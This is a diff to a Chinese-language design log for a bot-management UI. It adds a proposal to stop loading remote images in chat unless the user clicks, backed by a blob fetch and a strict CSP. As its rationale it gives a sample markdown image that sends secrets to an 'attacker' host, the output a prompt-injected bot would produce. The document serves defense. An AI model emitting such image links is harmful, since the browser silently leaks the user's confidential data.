@@ -759,3 +759,14 @@ cc1 的 bot 好幾個回合都收在 `authentication_failed`，對話只寫「�
   列 `GET /api/bots/deleted`：名稱、kind、專案、刪除於幾天前、最後對話時間，每列一顆「復原」。放在環境設定而不是側欄：它是低頻的救援入口，不該佔側欄的位置。
 - 復原走 store 的 `restoreBot`（通知上的「復原」與這份清單共用）：成功後重抓 state；失敗（撞名 409 等）用錯誤通知顯示 daemon 的說法。清單在 `bots` 變動時重抓，所以別的分頁刪／復原也會同步。
 - 只列 user bot 與專案還活著的；child 由父 bot／AGM 管。真畫面（mock；CJK 用補裝字型）：![最近刪除](screenshots/bot-restore/1-recent-deleted-list.png) ![復原後](screenshots/bot-restore/2-after-restore.png)
+
+## 對話裡的遠端圖片預設不載入（2026-10-01，issue #764，提案分支，等使用者拍板）
+
+bot 會讀外部內容；被 prompt injection 後只要輸出 `![](https://攻擊者/collect?d=機密)`，瀏覽器一渲染就替它把資料送出去。
+
+- **http(s) 圖片先畫佔位、點了才載入**：「🖼 外部圖片（網域）— 載入圖片」；網址帶很長的 query／fragment 或帳密時多一句警告（正常圖片網址很少那樣）。
+  daemon 自己的 `local-image`（專案目錄裡的檔）與 `data:` 圖片（行內資料、不會發請求）照常直接顯示。輸出中的氣泡（`LiveBubble`）與完成的訊息走同一個 `MarkdownImage`。
+- **載入方式＝瀏覽器 `fetch`→blob**（不帶 cookie、不帶 Referer，要 `image/*`、上限 10 MB），失敗就改成「在新分頁開啟」的連結（使用者自己點的連結）。
+  不做 daemon 代理：代理要在使用者機器上替任意網址發請求，得另外擋 SSRF（內網／loopback／DNS rebinding／轉址），攻擊面比這個問題本身還大；代價是對方沒開 CORS 的圖只能新分頁看。
+- **`index.html` 加 CSP `img-src 'self' data: blob:`**：之後新增的渲染路徑就算又用 `<img src="https://…">` 也載不了。CSP 不能對單張放寬，所以「點了才載」必須走 blob，而不是把 `src` 換成網址。
+- 取捨：bot 常貼 GitHub／shields.io 的圖，每張多一次點擊；之後若要「這個網域一律載入」，是使用者設定、而且要寫進 CSP 之外的白名單邏輯（blob 路徑），不能放寬 CSP。
